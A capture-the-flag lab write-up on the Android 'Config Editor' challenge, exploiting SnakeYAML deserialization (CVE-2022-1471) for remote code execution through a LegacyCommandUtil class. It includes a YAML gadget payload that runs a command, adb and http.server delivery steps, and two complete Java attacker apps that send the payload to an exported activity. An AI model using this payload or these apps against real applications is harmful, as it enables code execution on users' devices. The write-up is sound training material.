**Description**: Welcome to the **Config Editor** Challenge! In this lab, you'll dive into a realistic situation involving vulnerabilities in a widely-used third-party library. Your objective is to exploit a library-induced vulnerability to achieve RCE on an Android application.

**Download**: https://lautarovculic.com/my_files/configEditor.apk
**Link**: https://www.mobilehackinglab.com/path-player?courseid=lab-config-editor-rce

![[configEditor.png]]

Install the **APP** with **ADB**
```bash
adb install -r configEditor.apk
```

We can see that there ask for **storage permissions**.
Also, notice that we have **two buttons**, **`load`** and **`save`**.

We have an **TextEdit** so, we can **save** this text content into a **`.yml`** file.
By default, it select the **Downloads** directory.
Also, when we **load** a the file, it by default search in **Downloads** directory.
Notice that when we **save the file**, it saved as **`example.yml (1)`**. Its weird because I don't have any `.yml` file previous to this challenges.
So, let's try the `example.yml` file.

![[configEditor2.png]]
Not what I expected..
But, **why this app use `.yml` file for store text plain information?**

#### About `.yml` and Android
A `.yml` file (**YAML Ain't Markup Language**) is a **data serialization format widely used for its simplicity and human readability**. In the context of **mobile hacking**, `.yml` files can be a **goldmine for an attacker**, as they often **contain critical settings**, **credentials** or **important paths**.

#### Use of `.yml`
1️⃣ **Configuration Files**
- They store application configurations, such as API endpoints, encryption keys, permission settings, etc.

2️⃣ **Credential Files**
- In poorly configured environments, they may contain API keys, secrets, or even login credentials.

3️⃣ **Data persistence**
- Some apps use YAML to store serialized user or session data.

4️⃣ **Build Tools configuration**
- Tools such as **Gradle**, **CI/CD pipelines (Jenkins, GitLab CI)** or specific frameworks can use `.yml` to configure the build and deployment environment.

Let's continue with the **challenge**!
Decompile the **apk** with **apktool**
```bash
apktool d configEditor.apk
```
Also, let's import the **apk** into **jadx** for **source code** revision.

We can see that in this **method** (`loadYaml`)
```java
public final void loadYaml(Uri uri) {
    try {
        ParcelFileDescriptor openFileDescriptor = getContentResolver().openFileDescriptor(uri, "r");
        try {
            ParcelFileDescriptor parcelFileDescriptor = openFileDescriptor;
            FileInputStream inputStream = new FileInputStream(parcelFileDescriptor != null ? parcelFileDescriptor.getFileDescriptor() : null);
            DumperOptions $this$loadYaml_u24lambda_u249_u24lambda_u248 = new DumperOptions();
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setIndent(2);
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setPrettyFlow(true);
            Yaml yaml = new Yaml($this$loadYaml_u24lambda_u249_u24lambda_u248);
            Object deserializedData = yaml.load(inputStream);
            String serializedData = yaml.dump(deserializedData);
            ActivityMainBinding activityMainBinding = this.binding;
            if (activityMainBinding == null) {
                Intrinsics.throwUninitializedPropertyAccessException("binding");
                activityMainBinding = null;
            }
            activityMainBinding.contentArea.setText(serializedData);
            Unit unit = Unit.INSTANCE;
            Closeable.closeFinally(openFileDescriptor, null);
        } finally {
        }
    } catch (Exception e) {
        Log.e(TAG, "Error loading YAML: " + uri, e);
    }
}
```
Where the **configuration** of `YAML` files has been set.
For example, looking the **`DumperOptions`** class
```java
public class DumperOptions {
    private ScalarStyle defaultStyle = ScalarStyle.PLAIN;
    private FlowStyle defaultFlowStyle = FlowStyle.AUTO;
    private boolean canonical = false;
    private boolean allowUnicode = true;
    private boolean allowReadOnlyProperties = false;
    private int indent = 2;
    private int indicatorIndent = 0;
    private boolean indentWithIndicator = false;
    private int bestWidth = 80;
    private boolean splitLines = true;
    private LineBreak lineBreak = LineBreak.UNIX;
    private boolean explicitStart = false;
    private boolean explicitEnd = false;
    private TimeZone timeZone = null;
    private int maxSimpleKeyLength = 128;
    private boolean processComments = false;
    private NonPrintableStyle nonPrintableStyle = NonPrintableStyle.BINARY;
    private Version version = null;
    private Map<String, String> tags = null;
    private Boolean prettyFlow = false;
    private AnchorGenerator anchorGenerator = new NumberAnchorGenerator(0);
[...]
[...]
[...]
```
We can notice how is configured.

Continue reading the class, you can notice that in the `loadYaml()` function, if we insert **special chars** like `>` or `|`, (then save file) and we filter **logcat** with
```bash
adb logcat | grep "Error"
```
We can see that we get the **Error loading YAML:** message. 

Notice that the **third-party** library is **SnakeYAML**.
Some days ago, I was realize an **Mobile CTF** from **PwnSec CTF 2024** that have an **SnakeYAML Deserialization**.
https://lautarovculic.com/pwnsec-ctf-2024-snake/

So we must handle a **deserialization attack**. For this, we need search in the **source code** about some function that **execute commands**.

After a simple search in **jadx**
![[configEditor3.png]]
We can found the **`LegacyCommandUtil`** **class**.
```java
public final class LegacyCommandUtil {  
    public LegacyCommandUtil(String command) {  
        Intrinsics.checkNotNullParameter(command, "command");  
        Runtime.getRuntime().exec(command);  
    }  
}
```

As well in my previous CTF challenge, we need **exploit `CVE-2022-1471`**
https://www.veracode.com/blog/research/resolving-cve-2022-1471-snakeyaml-20-release-0

So, the **payload** probably must look like:
```YML
exploit: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["command"]
```

For example, my **machine IP** is `192.168.18.44` and the **mobile device IP** `192.168.18.162`.
Let's create this `.yml` file:
```YML
exploit: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["ping 192.168.18.44"]
```
And, let's set up a `tcpdump` command for **listen the ICMP request**
```bash
sudo tcpdump -i wlan0 | grep ICMP
```

Then, save the file in an `.yml` file with the app. And also, **load the `.yml`** file.
![[configEditor4.png]]

Notice that we **receive the ICMP request** due to *ping command*.
You also can test many others commands -repeating the *same process*, you can notice **if the command work or not** filtering with **logcat**
```bash
adb logcat | grep "Error"
```

So, we finish the **lab**. But, you has been notice that the **app have `exported=true`** the **activity**, and also have the **intent**?
```XML
<activity
    android:name="com.mobilehackinglab.configeditor.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="file"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="application/yaml"/>
    </intent-filter>
</activity>
```

We can craft an *"malicious"* app that **send the `.yml`** file for be *processed* by **Config Editor** app through the **file** scheme and via **http/https**.

So, in our machine, host with a **python server** the `exmploit.yml` file.
```bash
python3 -m http.server 8081
```
Then send through **ADB** for test
```bash
adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "http://192.168.18.44:8081/exploit.yml"
```

And yes, this work!
![[configEditor5.png]]

Taking advantage of the fact that the **activity is exported**, we can create a simple app that sends an intent.
```java
package com.lautaro.exploiteditor;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create intent
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse("http://192.168.18.44:8081/exploit.yml"));
        intent.setClassName("com.mobilehackinglab.configeditor", "com.mobilehackinglab.configeditor.MainActivity");

        // Launch intent
        startActivity(intent);

        // Finish malicious app
        finish();
    }
}
```

Or more better!!! We can use the **file** scheme, if we don't care about **host the `.yml`** file in an **external server** or the **victim device** don't have **internet access**.
We can create an **`.yml`** file with our app, then, send the intent loading the exploit.
```java
package com.lautaro.exploiteditor;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ExploitLauncher";
    private static final String FILE_NAME = "exploit.yml";
    private static final String EXPLOIT_CONTENT = "exploit: !!com.mobilehackinglab.configeditor.LegacyCommandUtil [\"ping 192.168.18.44\"]";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            // Create file
            File file = new File(getFilesDir(), FILE_NAME);
            FileOutputStream fos = new FileOutputStream(file);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(EXPLOIT_CONTENT);
            writer.close();
            fos.close();

            Log.d(TAG, "Archivo exploit.yml creado en: " + file.getAbsolutePath());

            // Create intent
            Uri fileUri = Uri.parse("file://" + file.getAbsolutePath());
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(fileUri, "application/yaml");
            intent.setClassName("com.mobilehackinglab.configeditor", "com.mobilehackinglab.configeditor.MainActivity");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            startActivity(intent);
            Log.d(TAG, "Intent enviado correctamente con archivo exploit.yml");

        } catch (Exception e) {
            Log.e(TAG, "Error al crear o enviar el exploit.yml", e);
        }

        // Finish our app
        finish();
    }
}
```
Don't forget put in the `AndroidManifest.xml` this permissions
```XML
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

I hope you found it useful (: